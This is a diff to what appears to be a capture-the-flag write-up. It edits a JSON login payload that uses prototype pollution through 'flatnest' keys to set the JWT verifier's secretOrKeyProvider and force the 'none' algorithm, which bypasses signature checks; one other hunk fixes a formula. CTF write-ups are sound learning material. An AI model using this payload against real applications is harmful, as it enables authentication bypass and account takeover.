@@ -321,12 +321,15 @@ I mentioned about 2 possible attacks for this problem, the attack that disables 
 Here's the demo payload for the 2nd approach if you want to learn how it works, have fun figuring out why it works :)
 ```js
 {
-	"sus": "no",
-	"__proto__.secretOrKeyProvider": "[Circular (username.__lookupGetter__)]",
-	"__proto__.algorithms": ["none"],
-	"__proto__.algorithm": "none",
-	"__proto__.alg": "none",
-	// "__proto__.isValid": "[Circular (username.constructor)]",
+	username: {
+		"sus": "no",
+		"__proto__.secretOrKeyProvider": "[Circular (username.__lookupGetter__)]",
+		"__proto__.algorithms": ["none"],
+		"__proto__.algorithm": "none",
+		"__proto__.alg": "none",
+		// "__proto__.isValid": "[Circular (username.constructor)]",
+	},
+	password: "any"
 }
 ```
 
@@ -912,7 +915,7 @@ And steps on each calculation
 
 - Odd iteraion: `sum(odd) = t * sum(even) + x`
 - Even iteration: `sum(even) = t * sum(odd) + y`
-- Initialization: `sum(0) = t * e + y`
+- Initialization: `sum(0) = e`
 
 Where `t = a[0]` and `e = b[0]`
 
@@ -1505,12 +1508,15 @@ listen("blackpinker.rocks", 30911)
 **Payload:**
 ```js
 {
-	"sus": "no",
-	"__proto__.secretOrKeyProvider": "[Circular (username.__lookupGetter__)]",
-	"__proto__.algorithms": ["none"],
-	"__proto__.algorithm": "none",
-	"__proto__.alg": "none",
-	// "__proto__.isValid": "[Circular (username.constructor)]",
+	username: {
+		"sus": "no",
+		"__proto__.secretOrKeyProvider": "[Circular (username.__lookupGetter__)]",
+		"__proto__.algorithms": ["none"],
+		"__proto__.algorithm": "none",
+		"__proto__.alg": "none",
+		// "__proto__.isValid": "[Circular (username.constructor)]",
+	},
+	password: "any"
 }
 ```
 
@@ -1654,12 +1660,15 @@ Why the first one? Because at first `username` is not appeared in `flatnest` loo
 (Well it's the same as the payload at the start of this section but whatever, i'm lazy to scroll up so :D)
 ```js
 {
-	"sus": "no",
-	"__proto__.secretOrKeyProvider": "[Circular (username.__lookupGetter__)]",
-	"__proto__.algorithms": ["none"],
-	"__proto__.algorithm": "none",
-	"__proto__.alg": "none",
-	// "__proto__.isValid": "[Circular (username.constructor)]",
+	username: {
+		"sus": "no",
+		"__proto__.secretOrKeyProvider": "[Circular (username.__lookupGetter__)]",
+		"__proto__.algorithms": ["none"],
+		"__proto__.algorithm": "none",
+		"__proto__.alg": "none",
+		// "__proto__.isValid": "[Circular (username.constructor)]",
+	},
+	password: "any"
 }
 ```
 
